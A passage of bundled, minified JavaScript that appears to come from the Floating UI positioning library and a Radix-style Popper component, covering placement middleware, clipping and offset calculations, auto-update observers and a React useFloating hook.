              , ye = Q || (he || !ne ? [getOppositePlacement(X)] : getExpandedPlacements(X))
              , be = ae !== "none";
            !Q && be && ye.push(...getOppositeAxisPlacements(X, ne, ae, pe));
            const xe = [X, ...ye]
              , Ae = await detectOverflow(M, oe)
              , Ee = [];
            let Be = ((O = w.flip) == null ? void 0 : O.overflows) || [];
            if (V && Ee.push(Ae[ue]),
            K) {
                const Z = getAlignmentSides(x, b, pe);
                Ee.push(Ae[Z[0]], Ae[Z[1]])
            }
            if (Be = [...Be, {
                placement: x,
                overflows: Ee
            }],
            !Ee.every(Z => Z <= 0)) {
                var ce, q;
                const Z = (((ce = w.flip) == null ? void 0 : ce.index) || 0) + 1
                  , te = xe[Z];
                if (te) {
                    var L;
                    const de = K === "alignment" ? fe !== getSideAxis(te) : !1
                      , re = ((L = Be[0]) == null ? void 0 : L.overflows[0]) > 0;
                    if (!de || re)
                        return {
                            data: {
                                index: Z,
                                overflows: Be
                            },
                            reset: {
                                placement: te
                            }
                        }
                }
                let se = (q = Be.filter(de => de.overflows[0] <= 0).sort( (de, re) => de.overflows[1] - re.overflows[1])[0]) == null ? void 0 : q.placement;
                if (!se)
                    switch (ee) {
                    case "bestFit":
                        {
                            var U;
                            const de = (U = Be.filter(re => {
                                if (be) {
                                    const $ = getSideAxis(re.placement);
                                    return $ === fe || $ === "y"
                                }
                                return !0
                            }
                            ).map(re => [re.placement, re.overflows.filter($ => $ > 0).reduce( ($, ie) => $ + ie, 0)]).sort( (re, $) => re[1] - $[1])[0]) == null ? void 0 : U[0];
                            de && (se = de);
                            break
                        }
                    case "initialPlacement":
                        se = X;
                        break
                    }
                if (x !== se)
                    return {
                        reset: {
                            placement: se
                        }
                    }
            }
            return {}
        }
    }
};
function getSideOffsets(_, M) {
    return {
        top: _.top - M.height,
        right: _.right - M.width,
        bottom: _.bottom - M.height,
        left: _.left - M.width
    }
}
function isAnySideFullyClipped(_) {
    return sides.some(M => _[M] >= 0)
}
const hide$2 = function(_) {
    return _ === void 0 && (_ = {}),
    {
        name: "hide",
        options: _,
        async fn(M) {
            const {rects: j} = M
              , {strategy: O="referenceHidden", ...x} = evaluate(_, M);
            switch (O) {
            case "referenceHidden":
                {
                    const w = await detectOverflow(M, {
                        ...x,
                        elementContext: "reference"
                    })
                      , b = getSideOffsets(w, j.reference);
                    return {
                        data: {
                            referenceHiddenOffsets: b,
                            referenceHidden: isAnySideFullyClipped(b)
                        }
                    }
                }
            case "escaped":
                {
                    const w = await detectOverflow(M, {
                        ...x,
                        altBoundary: !0
                    })
                      , b = getSideOffsets(w, j.floating);
                    return {
                        data: {
                            escapedOffsets: b,
                            escaped: isAnySideFullyClipped(b)
                        }
                    }
                }
            default:
                return {}
            }
        }
    }
};
async function convertValueToCoords(_, M) {
    const {placement: j, platform: O, elements: x} = _
      , w = await (O.isRTL == null ? void 0 : O.isRTL(x.floating))
      , b = getSide(j)
      , X = getAlignment(j)
      , Y = getSideAxis(j) === "y"
      , F = ["left", "top"].includes(b) ? -1 : 1
      , V = w && Y ? -1 : 1
      , K = evaluate(M, _);
    let {mainAxis: Q, crossAxis: ee, alignmentAxis: ae} = typeof K == "number" ? {
        mainAxis: K,
        crossAxis: 0,
        alignmentAxis: null
    } : {
        mainAxis: K.mainAxis || 0,
        crossAxis: K.crossAxis || 0,
        alignmentAxis: K.alignmentAxis
    };
    return X && typeof ae == "number" && (ee = X === "end" ? ae * -1 : ae),
    Y ? {
        x: ee * V,
        y: Q * F
    } : {
        x: Q * F,
        y: ee * V
    }
}
const offset$2 = function(_) {
    return _ === void 0 && (_ = 0),
    {
        name: "offset",
        options: _,
        async fn(M) {
            var j, O;
            const {x, y: w, placement: b, middlewareData: X} = M
              , Y = await convertValueToCoords(M, _);
            return b === ((j = X.offset) == null ? void 0 : j.placement) && (O = X.arrow) != null && O.alignmentOffset ? {} : {
                x: x + Y.x,
                y: w + Y.y,
                data: {
                    ...Y,
                    placement: b
                }
            }
        }
    }
}
  , shift$2 = function(_) {
    return _ === void 0 && (_ = {}),
    {
        name: "shift",
        options: _,
        async fn(M) {
            const {x: j, y: O, placement: x} = M
              , {mainAxis: w=!0, crossAxis: b=!1, limiter: X={
                fn: oe => {
                    let {x: ue, y: fe} = oe;
                    return {
                        x: ue,
                        y: fe
                    }
                }
            }, ...Y} = evaluate(_, M)
              , F = {
                x: j,
                y: O
            }
              , V = await detectOverflow(M, Y)
              , K = getSideAxis(getSide(x))
              , Q = getOppositeAxis(K);
            let ee = F[Q]
              , ae = F[K];
            if (w) {
                const oe = Q === "y" ? "top" : "left"
                  , ue = Q === "y" ? "bottom" : "right"
                  , fe = ee + V[oe]
                  , he = ee - V[ue];
                ee = clamp$1(fe, ee, he)
            }
            if (b) {
                const oe = K === "y" ? "top" : "left"
                  , ue = K === "y" ? "bottom" : "right"
                  , fe = ae + V[oe]
                  , he = ae - V[ue];
                ae = clamp$1(fe, ae, he)
            }
            const ne = X.fn({
                ...M,
                [Q]: ee,
                [K]: ae
            });
            return {
                ...ne,
                data: {
                    x: ne.x - j,
                    y: ne.y - O,
                    enabled: {
                        [Q]: w,
                        [K]: b
                    }
                }
            }
        }
    }
}
  , limitShift$2 = function(_) {
    return _ === void 0 && (_ = {}),
    {
        options: _,
        fn(M) {
            const {x: j, y: O, placement: x, rects: w, middlewareData: b} = M
              , {offset: X=0, mainAxis: Y=!0, crossAxis: F=!0} = evaluate(_, M)
              , V = {
                x: j,
                y: O
            }
              , K = getSideAxis(x)
              , Q = getOppositeAxis(K);
            let ee = V[Q]
              , ae = V[K];
            const ne = evaluate(X, M)
              , oe = typeof ne == "number" ? {
                mainAxis: ne,
                crossAxis: 0
            } : {
                mainAxis: 0,
                crossAxis: 0,
                ...ne
            };
            if (Y) {
                const he = Q === "y" ? "height" : "width"
                  , pe = w.reference[Q] - w.floating[he] + oe.mainAxis
                  , ye = w.reference[Q] + w.reference[he] - oe.mainAxis;
                ee < pe ? ee = pe : ee > ye && (ee = ye)
            }
            if (F) {
                var ue, fe;
                const he = Q === "y" ? "width" : "height"
                  , pe = ["top", "left"].includes(getSide(x))
                  , ye = w.reference[K] - w.floating[he] + (pe && ((ue = b.offset) == null ? void 0 : ue[K]) || 0) + (pe ? 0 : oe.crossAxis)
                  , be = w.reference[K] + w.reference[he] + (pe ? 0 : ((fe = b.offset) == null ? void 0 : fe[K]) || 0) - (pe ? oe.crossAxis : 0);
                ae < ye ? ae = ye : ae > be && (ae = be)
            }
            return {
                [Q]: ee,
                [K]: ae
            }
        }
    }
}
  , size$2 = function(_) {
    return _ === void 0 && (_ = {}),
    {
        name: "size",
        options: _,
        async fn(M) {
            var j, O;
            const {placement: x, rects: w, platform: b, elements: X} = M
              , {apply: Y= () => {}
            , ...F} = evaluate(_, M)
              , V = await detectOverflow(M, F)
              , K = getSide(x)
              , Q = getAlignment(x)
              , ee = getSideAxis(x) === "y"
              , {width: ae, height: ne} = w.floating;
            let oe, ue;
            K === "top" || K === "bottom" ? (oe = K,
            ue = Q === (await (b.isRTL == null ? void 0 : b.isRTL(X.floating)) ? "start" : "end") ? "left" : "right") : (ue = K,
            oe = Q === "end" ? "top" : "bottom");
            const fe = ne - V.top - V.bottom
              , he = ae - V.left - V.right
              , pe = min$1(ne - V[oe], fe)
              , ye = min$1(ae - V[ue], he)
              , be = !M.middlewareData.shift;
            let xe = pe
              , Ae = ye;
            if ((j = M.middlewareData.shift) != null && j.enabled.x && (Ae = he),
            (O = M.middlewareData.shift) != null && O.enabled.y && (xe = fe),
            be && !Q) {
                const Be = max$1(V.left, 0)
                  , ce = max$1(V.right, 0)
                  , q = max$1(V.top, 0)
                  , L = max$1(V.bottom, 0);
                ee ? Ae = ae - 2 * (Be !== 0 || ce !== 0 ? Be + ce : max$1(V.left, V.right)) : xe = ne - 2 * (q !== 0 || L !== 0 ? q + L : max$1(V.top, V.bottom))
            }
            await Y({
                ...M,
                availableWidth: Ae,
                availableHeight: xe
            });
            const Ee = await b.getDimensions(X.floating);
            return ae !== Ee.width || ne !== Ee.height ? {
                reset: {
                    rects: !0
                }
            } : {}
        }
    }
};
function hasWindow() {
    return typeof window < "u"
}
function getNodeName(_) {
    return isNode(_) ? (_.nodeName || "").toLowerCase() : "#document"
}
function getWindow(_) {
    var M;
    return (_ == null || (M = _.ownerDocument) == null ? void 0 : M.defaultView) || window
}
function getDocumentElement(_) {
    var M;
    return (M = (isNode(_) ? _.ownerDocument : _.document) || window.document) == null ? void 0 : M.documentElement
}
function isNode(_) {
    return hasWindow() ? _ instanceof Node || _ instanceof getWindow(_).Node : !1
}
function isElement(_) {
    return hasWindow() ? _ instanceof Element || _ instanceof getWindow(_).Element : !1
}
function isHTMLElement(_) {
    return hasWindow() ? _ instanceof HTMLElement || _ instanceof getWindow(_).HTMLElement : !1
}
function isShadowRoot(_) {
    return !hasWindow() || typeof ShadowRoot > "u" ? !1 : _ instanceof ShadowRoot || _ instanceof getWindow(_).ShadowRoot
}
function isOverflowElement(_) {
    const {overflow: M, overflowX: j, overflowY: O, display: x} = getComputedStyle$1(_);
    return /auto|scroll|overlay|hidden|clip/.test(M + O + j) && !["inline", "contents"].includes(x)
}
function isTableElement(_) {
    return ["table", "td", "th"].includes(getNodeName(_))
}
function isTopLayer(_) {
    return [":popover-open", ":modal"].some(M => {
        try {
            return _.matches(M)
        } catch {
            return !1
        }
    }
    )
}
function isContainingBlock(_) {
    const M = isWebKit()
      , j = isElement(_) ? getComputedStyle$1(_) : _;
    return ["transform", "translate", "scale", "rotate", "perspective"].some(O => j[O] ? j[O] !== "none" : !1) || (j.containerType ? j.containerType !== "normal" : !1) || !M && (j.backdropFilter ? j.backdropFilter !== "none" : !1) || !M && (j.filter ? j.filter !== "none" : !1) || ["transform", "translate", "scale", "rotate", "perspective", "filter"].some(O => (j.willChange || "").includes(O)) || ["paint", "layout", "strict", "content"].some(O => (j.contain || "").includes(O))
}
function getContainingBlock(_) {
    let M = getParentNode(_);
    for (; isHTMLElement(M) && !isLastTraversableNode(M); ) {
        if (isContainingBlock(M))
            return M;
        if (isTopLayer(M))
            return null;
        M = getParentNode(M)
    }
    return null
}
function isWebKit() {
    return typeof CSS > "u" || !CSS.supports ? !1 : CSS.supports("-webkit-backdrop-filter", "none")
}
function isLastTraversableNode(_) {
    return ["html", "body", "#document"].includes(getNodeName(_))
}
function getComputedStyle$1(_) {
    return getWindow(_).getComputedStyle(_)
}
function getNodeScroll(_) {
    return isElement(_) ? {
        scrollLeft: _.scrollLeft,
        scrollTop: _.scrollTop
    } : {
        scrollLeft: _.scrollX,
        scrollTop: _.scrollY
    }
}
function getParentNode(_) {
    if (getNodeName(_) === "html")
        return _;
    const M = _.assignedSlot || _.parentNode || isShadowRoot(_) && _.host || getDocumentElement(_);
    return isShadowRoot(M) ? M.host : M
}
function getNearestOverflowAncestor(_) {
    const M = getParentNode(_);
    return isLastTraversableNode(M) ? _.ownerDocument ? _.ownerDocument.body : _.body : isHTMLElement(M) && isOverflowElement(M) ? M : getNearestOverflowAncestor(M)
}
function getOverflowAncestors(_, M, j) {
    var O;
    M === void 0 && (M = []),
    j === void 0 && (j = !0);
    const x = getNearestOverflowAncestor(_)
      , w = x === ((O = _.ownerDocument) == null ? void 0 : O.body)
      , b = getWindow(x);
    if (w) {
        const X = getFrameElement(b);
        return M.concat(b, b.visualViewport || [], isOverflowElement(x) ? x : [], X && j ? getOverflowAncestors(X) : [])
    }
    return M.concat(x, getOverflowAncestors(x, [], j))
}
function getFrameElement(_) {
    return _.parent && Object.getPrototypeOf(_.parent) ? _.frameElement : null
}
function getCssDimensions(_) {
    const M = getComputedStyle$1(_);
    let j = parseFloat(M.width) || 0
      , O = parseFloat(M.height) || 0;
    const x = isHTMLElement(_)
      , w = x ? _.offsetWidth : j
      , b = x ? _.offsetHeight : O
      , X = round$1(j) !== w || round$1(O) !== b;
    return X && (j = w,
    O = b),
    {
        width: j,
        height: O,
        $: X
    }
}
function unwrapElement(_) {
    return isElement(_) ? _ : _.contextElement
}
function getScale(_) {
    const M = unwrapElement(_);
    if (!isHTMLElement(M))
        return createCoords(1);
    const j = M.getBoundingClientRect()
      , {width: O, height: x, $: w} = getCssDimensions(M);
    let b = (w ? round$1(j.width) : j.width) / O
      , X = (w ? round$1(j.height) : j.height) / x;
    return (!b || !Number.isFinite(b)) && (b = 1),
    (!X || !Number.isFinite(X)) && (X = 1),
    {
        x: b,
        y: X
    }
}
const noOffsets = createCoords(0);
function getVisualOffsets(_) {
    const M = getWindow(_);
    return !isWebKit() || !M.visualViewport ? noOffsets : {
        x: M.visualViewport.offsetLeft,
        y: M.visualViewport.offsetTop
    }
}
function shouldAddVisualOffsets(_, M, j) {
    return M === void 0 && (M = !1),
    !j || M && j !== getWindow(_) ? !1 : M
}
function getBoundingClientRect(_, M, j, O) {
    M === void 0 && (M = !1),
    j === void 0 && (j = !1);
    const x = _.getBoundingClientRect()
      , w = unwrapElement(_);
    let b = createCoords(1);
    M && (O ? isElement(O) && (b = getScale(O)) : b = getScale(_));
    const X = shouldAddVisualOffsets(w, j, O) ? getVisualOffsets(w) : createCoords(0);
    let Y = (x.left + X.x) / b.x
      , F = (x.top + X.y) / b.y
      , V = x.width / b.x
      , K = x.height / b.y;
    if (w) {
        const Q = getWindow(w)
          , ee = O && isElement(O) ? getWindow(O) : O;
        let ae = Q
          , ne = getFrameElement(ae);
        for (; ne && O && ee !== ae; ) {
            const oe = getScale(ne)
              , ue = ne.getBoundingClientRect()
              , fe = getComputedStyle$1(ne)
              , he = ue.left + (ne.clientLeft + parseFloat(fe.paddingLeft)) * oe.x
              , pe = ue.top + (ne.clientTop + parseFloat(fe.paddingTop)) * oe.y;
            Y *= oe.x,
            F *= oe.y,
            V *= oe.x,
            K *= oe.y,
            Y += he,
            F += pe,
            ae = getWindow(ne),
            ne = getFrameElement(ae)
        }
    }
    return rectToClientRect({
        width: V,
        height: K,
        x: Y,
        y: F
    })
}
function getWindowScrollBarX(_, M) {
    const j = getNodeScroll(_).scrollLeft;
    return M ? M.left + j : getBoundingClientRect(getDocumentElement(_)).left + j
}
function getHTMLOffset(_, M, j) {
    j === void 0 && (j = !1);
    const O = _.getBoundingClientRect()
      , x = O.left + M.scrollLeft - (j ? 0 : getWindowScrollBarX(_, O))
      , w = O.top + M.scrollTop;
    return {
        x,
        y: w
    }
}
function convertOffsetParentRelativeRectToViewportRelativeRect(_) {
    let {elements: M, rect: j, offsetParent: O, strategy: x} = _;
    const w = x === "fixed"
      , b = getDocumentElement(O)
      , X = M ? isTopLayer(M.floating) : !1;
    if (O === b || X && w)
        return j;
    let Y = {
        scrollLeft: 0,
        scrollTop: 0
    }
      , F = createCoords(1);
    const V = createCoords(0)
      , K = isHTMLElement(O);
    if ((K || !K && !w) && ((getNodeName(O) !== "body" || isOverflowElement(b)) && (Y = getNodeScroll(O)),
    isHTMLElement(O))) {
        const ee = getBoundingClientRect(O);
        F = getScale(O),
        V.x = ee.x + O.clientLeft,
        V.y = ee.y + O.clientTop
    }
    const Q = b && !K && !w ? getHTMLOffset(b, Y, !0) : createCoords(0);
    return {
        width: j.width * F.x,
        height: j.height * F.y,
        x: j.x * F.x - Y.scrollLeft * F.x + V.x + Q.x,
        y: j.y * F.y - Y.scrollTop * F.y + V.y + Q.y
    }
}
function getClientRects(_) {
    return Array.from(_.getClientRects())
}
function getDocumentRect(_) {
    const M = getDocumentElement(_)
      , j = getNodeScroll(_)
      , O = _.ownerDocument.body
      , x = max$1(M.scrollWidth, M.clientWidth, O.scrollWidth, O.clientWidth)
      , w = max$1(M.scrollHeight, M.clientHeight, O.scrollHeight, O.clientHeight);
    let b = -j.scrollLeft + getWindowScrollBarX(_);
    const X = -j.scrollTop;
    return getComputedStyle$1(O).direction === "rtl" && (b += max$1(M.clientWidth, O.clientWidth) - x),
    {
        width: x,
        height: w,
        x: b,
        y: X
    }
}
function getViewportRect(_, M) {
    const j = getWindow(_)
      , O = getDocumentElement(_)
      , x = j.visualViewport;
    let w = O.clientWidth
      , b = O.clientHeight
      , X = 0
      , Y = 0;
    if (x) {
        w = x.width,
        b = x.height;
        const F = isWebKit();
        (!F || F && M === "fixed") && (X = x.offsetLeft,
        Y = x.offsetTop)
    }
    return {
        width: w,
        height: b,
        x: X,
        y: Y
    }
}
function getInnerBoundingClientRect(_, M) {
    const j = getBoundingClientRect(_, !0, M === "fixed")
      , O = j.top + _.clientTop
      , x = j.left + _.clientLeft
      , w = isHTMLElement(_) ? getScale(_) : createCoords(1)
      , b = _.clientWidth * w.x
      , X = _.clientHeight * w.y
      , Y = x * w.x
      , F = O * w.y;
    return {
        width: b,
        height: X,
        x: Y,
        y: F
    }
}
function getClientRectFromClippingAncestor(_, M, j) {
    let O;
    if (M === "viewport")
        O = getViewportRect(_, j);
    else if (M === "document")
        O = getDocumentRect(getDocumentElement(_));
    else if (isElement(M))
        O = getInnerBoundingClientRect(M, j);
    else {
        const x = getVisualOffsets(_);
        O = {
            x: M.x - x.x,
            y: M.y - x.y,
            width: M.width,
            height: M.height
        }
    }
    return rectToClientRect(O)
}
function hasFixedPositionAncestor(_, M) {
    const j = getParentNode(_);
    return j === M || !isElement(j) || isLastTraversableNode(j) ? !1 : getComputedStyle$1(j).position === "fixed" || hasFixedPositionAncestor(j, M)
}
function getClippingElementAncestors(_, M) {
    const j = M.get(_);
    if (j)
        return j;
    let O = getOverflowAncestors(_, [], !1).filter(X => isElement(X) && getNodeName(X) !== "body")
      , x = null;
    const w = getComputedStyle$1(_).position === "fixed";
    let b = w ? getParentNode(_) : _;
    for (; isElement(b) && !isLastTraversableNode(b); ) {
        const X = getComputedStyle$1(b)
          , Y = isContainingBlock(b);
        !Y && X.position === "fixed" && (x = null),
        (w ? !Y && !x : !Y && X.position === "static" && !!x && ["absolute", "fixed"].includes(x.position) || isOverflowElement(b) && !Y && hasFixedPositionAncestor(_, b)) ? O = O.filter(V => V !== b) : x = X,
        b = getParentNode(b)
    }
    return M.set(_, O),
    O
}
function getClippingRect(_) {
    let {element: M, boundary: j, rootBoundary: O, strategy: x} = _;
    const b = [...j === "clippingAncestors" ? isTopLayer(M) ? [] : getClippingElementAncestors(M, this._c) : [].concat(j), O]
      , X = b[0]
      , Y = b.reduce( (F, V) => {
        const K = getClientRectFromClippingAncestor(M, V, x);
        return F.top = max$1(K.top, F.top),
        F.right = min$1(K.right, F.right),
        F.bottom = min$1(K.bottom, F.bottom),
        F.left = max$1(K.left, F.left),
        F
    }
    , getClientRectFromClippingAncestor(M, X, x));
    return {
        width: Y.right - Y.left,
        height: Y.bottom - Y.top,
        x: Y.left,
        y: Y.top
    }
}
function getDimensions(_) {
    const {width: M, height: j} = getCssDimensions(_);
    return {
        width: M,
        height: j
    }
}
function getRectRelativeToOffsetParent(_, M, j) {
    const O = isHTMLElement(M)
      , x = getDocumentElement(M)
      , w = j === "fixed"
      , b = getBoundingClientRect(_, !0, w, M);
    let X = {
        scrollLeft: 0,
        scrollTop: 0
    };
    const Y = createCoords(0);
    function F() {
        Y.x = getWindowScrollBarX(x)
    }
    if (O || !O && !w)
        if ((getNodeName(M) !== "body" || isOverflowElement(x)) && (X = getNodeScroll(M)),
        O) {
            const ee = getBoundingClientRect(M, !0, w, M);
            Y.x = ee.x + M.clientLeft,
            Y.y = ee.y + M.clientTop
        } else
            x && F();
    w && !O && x && F();
    const V = x && !O && !w ? getHTMLOffset(x, X) : createCoords(0)
      , K = b.left + X.scrollLeft - Y.x - V.x
      , Q = b.top + X.scrollTop - Y.y - V.y;
    return {
        x: K,
        y: Q,
        width: b.width,
        height: b.height
    }
}
function isStaticPositioned(_) {
    return getComputedStyle$1(_).position === "static"
}
function getTrueOffsetParent(_, M) {
    if (!isHTMLElement(_) || getComputedStyle$1(_).position === "fixed")
        return null;
    if (M)
        return M(_);
    let j = _.offsetParent;
    return getDocumentElement(_) === j && (j = j.ownerDocument.body),
    j
}
function getOffsetParent(_, M) {
    const j = getWindow(_);
    if (isTopLayer(_))
        return j;
    if (!isHTMLElement(_)) {
        let x = getParentNode(_);
        for (; x && !isLastTraversableNode(x); ) {
            if (isElement(x) && !isStaticPositioned(x))
                return x;
            x = getParentNode(x)
        }
        return j
    }
    let O = getTrueOffsetParent(_, M);
    for (; O && isTableElement(O) && isStaticPositioned(O); )
        O = getTrueOffsetParent(O, M);
    return O && isLastTraversableNode(O) && isStaticPositioned(O) && !isContainingBlock(O) ? j : O || getContainingBlock(_) || j
}
const getElementRects = async function(_) {
    const M = this.getOffsetParent || getOffsetParent
      , j = this.getDimensions
      , O = await j(_.floating);
    return {
        reference: getRectRelativeToOffsetParent(_.reference, await M(_.floating), _.strategy),
        floating: {
            x: 0,
            y: 0,
            width: O.width,
            height: O.height
        }
    }
};
function isRTL(_) {
    return getComputedStyle$1(_).direction === "rtl"
}
const platform$2 = {
    convertOffsetParentRelativeRectToViewportRelativeRect,
    getDocumentElement,
    getClippingRect,
    getOffsetParent,
    getElementRects,
    getClientRects,
    getDimensions,
    getScale,
    isElement,
    isRTL
};
function rectsAreEqual(_, M) {
    return _.x === M.x && _.y === M.y && _.width === M.width && _.height === M.height
}
function observeMove(_, M) {
    let j = null, O;
    const x = getDocumentElement(_);
    function w() {
        var X;
        clearTimeout(O),
        (X = j) == null || X.disconnect(),
        j = null
    }
    function b(X, Y) {
        X === void 0 && (X = !1),
        Y === void 0 && (Y = 1),
        w();
        const F = _.getBoundingClientRect()
          , {left: V, top: K, width: Q, height: ee} = F;
        if (X || M(),
        !Q || !ee)
            return;
        const ae = floor$1(K)
          , ne = floor$1(x.clientWidth - (V + Q))
          , oe = floor$1(x.clientHeight - (K + ee))
          , ue = floor$1(V)
          , he = {
            rootMargin: -ae + "px " + -ne + "px " + -oe + "px " + -ue + "px",
            threshold: max$1(0, min$1(1, Y)) || 1
        };
        let pe = !0;
        function ye(be) {
            const xe = be[0].intersectionRatio;
            if (xe !== Y) {
                if (!pe)
                    return b();
                xe ? b(!1, xe) : O = setTimeout( () => {
                    b(!1, 1e-7)
                }
                , 1e3)
            }
            xe === 1 && !rectsAreEqual(F, _.getBoundingClientRect()) && b(),
            pe = !1
        }
        try {
            j = new IntersectionObserver(ye,{
                ...he,
                root: x.ownerDocument
            })
        } catch {
            j = new IntersectionObserver(ye,he)
        }
        j.observe(_)
    }
    return b(!0),
    w
}
function autoUpdate(_, M, j, O) {
    O === void 0 && (O = {});
    const {ancestorScroll: x=!0, ancestorResize: w=!0, elementResize: b=typeof ResizeObserver == "function", layoutShift: X=typeof IntersectionObserver == "function", animationFrame: Y=!1} = O
      , F = unwrapElement(_)
      , V = x || w ? [...F ? getOverflowAncestors(F) : [], ...getOverflowAncestors(M)] : [];
    V.forEach(ue => {
        x && ue.addEventListener("scroll", j, {
            passive: !0
        }),
        w && ue.addEventListener("resize", j)
    }
    );
    const K = F && X ? observeMove(F, j) : null;
    let Q = -1
      , ee = null;
    b && (ee = new ResizeObserver(ue => {
        let[fe] = ue;
        fe && fe.target === F && ee && (ee.unobserve(M),
        cancelAnimationFrame(Q),
        Q = requestAnimationFrame( () => {
            var he;
            (he = ee) == null || he.observe(M)
        }
        )),
        j()
    }
    ),
    F && !Y && ee.observe(F),
    ee.observe(M));
    let ae, ne = Y ? getBoundingClientRect(_) : null;
    Y && oe();
    function oe() {
        const ue = getBoundingClientRect(_);
        ne && !rectsAreEqual(ne, ue) && j(),
        ne = ue,
        ae = requestAnimationFrame(oe)
    }
    return j(),
    () => {
        var ue;
        V.forEach(fe => {
            x && fe.removeEventListener("scroll", j),
            w && fe.removeEventListener("resize", j)
        }
        ),
        K == null || K(),
        (ue = ee) == null || ue.disconnect(),
        ee = null,
        Y && cancelAnimationFrame(ae)
    }
}
const offset$1 = offset$2
  , shift$1 = shift$2
  , flip$1 = flip$2
  , size$1 = size$2
  , hide$1 = hide$2
  , arrow$2 = arrow$3
  , limitShift$1 = limitShift$2
  , computePosition = (_, M, j) => {
    const O = new Map
      , x = {
        platform: platform$2,
        ...j
    }
      , w = {
        ...x.platform,
        _c: O
    };
    return computePosition$1(_, M, {
        ...x,
        platform: w
    })
}
;
var index$1 = typeof document < "u" ? reactExports.useLayoutEffect : reactExports.useEffect;
function deepEqual(_, M) {
    if (_ === M)
        return !0;
    if (typeof _ != typeof M)
        return !1;
    if (typeof _ == "function" && _.toString() === M.toString())
        return !0;
    let j, O, x;
    if (_ && M && typeof _ == "object") {
        if (Array.isArray(_)) {
            if (j = _.length,
            j !== M.length)
                return !1;
            for (O = j; O-- !== 0; )
                if (!deepEqual(_[O], M[O]))
                    return !1;
            return !0
        }
        if (x = Object.keys(_),
        j = x.length,
        j !== Object.keys(M).length)
            return !1;
        for (O = j; O-- !== 0; )
            if (!{}.hasOwnProperty.call(M, x[O]))
                return !1;
        for (O = j; O-- !== 0; ) {
            const w = x[O];
            if (!(w === "_owner" && _.$$typeof) && !deepEqual(_[w], M[w]))
                return !1
        }
        return !0
    }
    return _ !== _ && M !== M
}
function getDPR(_) {
    return typeof window > "u" ? 1 : (_.ownerDocument.defaultView || window).devicePixelRatio || 1
}
function roundByDPR(_, M) {
    const j = getDPR(_);
    return Math.round(M * j) / j
}
function useLatestRef(_) {
    const M = reactExports.useRef(_);
    return index$1( () => {
        M.current = _
    }
    ),
    M
}
function useFloating(_) {
    _ === void 0 && (_ = {});
    const {placement: M="bottom", strategy: j="absolute", middleware: O=[], platform: x, elements: {reference: w, floating: b}={}, transform: X=!0, whileElementsMounted: Y, open: F} = _
      , [V,K] = reactExports.useState({
        x: 0,
        y: 0,
        strategy: j,
        placement: M,
        middlewareData: {},
        isPositioned: !1
    })
      , [Q,ee] = reactExports.useState(O);
    deepEqual(Q, O) || ee(O);
    const [ae,ne] = reactExports.useState(null)
      , [oe,ue] = reactExports.useState(null)
      , fe = reactExports.useCallback(de => {
        de !== be.current && (be.current = de,
        ne(de))
    }
    , [])
      , he = reactExports.useCallback(de => {
        de !== xe.current && (xe.current = de,
        ue(de))
    }
    , [])
      , pe = w || ae
      , ye = b || oe
      , be = reactExports.useRef(null)
      , xe = reactExports.useRef(null)
      , Ae = reactExports.useRef(V)
      , Ee = Y != null
      , Be = useLatestRef(Y)
      , ce = useLatestRef(x)
      , q = useLatestRef(F)
      , L = reactExports.useCallback( () => {
        if (!be.current || !xe.current)
            return;
        const de = {
            placement: M,
            strategy: j,
            middleware: Q
        };
        ce.current && (de.platform = ce.current),
        computePosition(be.current, xe.current, de).then(re => {
            const $ = {
                ...re,
                isPositioned: q.current !== !1
            };
            U.current && !deepEqual(Ae.current, $) && (Ae.current = $,
            reactDomExports.flushSync( () => {
                K($)
            }
            ))
        }
        )
    }
    , [Q, M, j, ce, q]);
    index$1( () => {
        F === !1 && Ae.current.isPositioned && (Ae.current.isPositioned = !1,
        K(de => ({
            ...de,
            isPositioned: !1
        })))
    }
    , [F]);
    const U = reactExports.useRef(!1);
    index$1( () => (U.current = !0,
    () => {
        U.current = !1
    }
    ), []),
    index$1( () => {
        if (pe && (be.current = pe),
        ye && (xe.current = ye),
        pe && ye) {
            if (Be.current)
                return Be.current(pe, ye, L);
            L()
        }
    }
    , [pe, ye, L, Be, Ee]);
    const Z = reactExports.useMemo( () => ({
        reference: be,
        floating: xe,
        setReference: fe,
        setFloating: he
    }), [fe, he])
      , te = reactExports.useMemo( () => ({
        reference: pe,
        floating: ye
    }), [pe, ye])
      , se = reactExports.useMemo( () => {
        const de = {
            position: j,
            left: 0,
            top: 0
        };
        if (!te.floating)
            return de;
        const re = roundByDPR(te.floating, V.x)
          , $ = roundByDPR(te.floating, V.y);
        return X ? {
            ...de,
            transform: "translate(" + re + "px, " + $ + "px)",
            ...getDPR(te.floating) >= 1.5 && {
                willChange: "transform"
            }
        } : {
            position: j,
            left: re,
            top: $
        }
    }
    , [j, X, te.floating, V.x, V.y]);
    return reactExports.useMemo( () => ({
        ...V,
        update: L,
        refs: Z,
        elements: te,
        floatingStyles: se
    }), [V, L, Z, te, se])
}
const arrow$1 = _ => {
    function M(j) {
        return {}.hasOwnProperty.call(j, "current")
    }
    return {
        name: "arrow",
        options: _,
        fn(j) {
            const {element: O, padding: x} = typeof _ == "function" ? _(j) : _;
            return O && M(O) ? O.current != null ? arrow$2({
                element: O.current,
                padding: x
            }).fn(j) : {} : O ? arrow$2({
                element: O,
                padding: x
            }).fn(j) : {}
        }
    }
}
  , offset = (_, M) => ({
    ...offset$1(_),
    options: [_, M]
})
  , shift = (_, M) => ({
    ...shift$1(_),
    options: [_, M]
})
  , limitShift = (_, M) => ({
    ...limitShift$1(_),
    options: [_, M]
})
  , flip = (_, M) => ({
    ...flip$1(_),
    options: [_, M]
})
  , size = (_, M) => ({
    ...size$1(_),
    options: [_, M]
})
  , hide = (_, M) => ({
    ...hide$1(_),
    options: [_, M]
})
  , arrow = (_, M) => ({
    ...arrow$1(_),
    options: [_, M]
});
var NAME = "Arrow"
  , Arrow$1 = reactExports.forwardRef( (_, M) => {
    const {children: j, width: O=10, height: x=5, ...w} = _;
    return jsxRuntimeExports.jsx(Primitive$1.svg, {
        ...w,
        ref: M,
        width: O,
        height: x,
        viewBox: "0 0 30 10",
        preserveAspectRatio: "none",
        children: _.asChild ? j : jsxRuntimeExports.jsx("polygon", {
            points: "0,0 30,0 15,10"
        })
    })
}
);
Arrow$1.displayName = NAME;
var Root$2 = Arrow$1
  , POPPER_NAME = "Popper"
  , [createPopperContext,createPopperScope] = createContextScope(POPPER_NAME)
  , [PopperProvider,usePopperContext] = createPopperContext(POPPER_NAME)
  , Popper = _ => {
    const {__scopePopper: M, children: j} = _
      , [O,x] = reactExports.useState(null);
    return jsxRuntimeExports.jsx(PopperProvider, {
        scope: M,
        anchor: O,
        onAnchorChange: x,
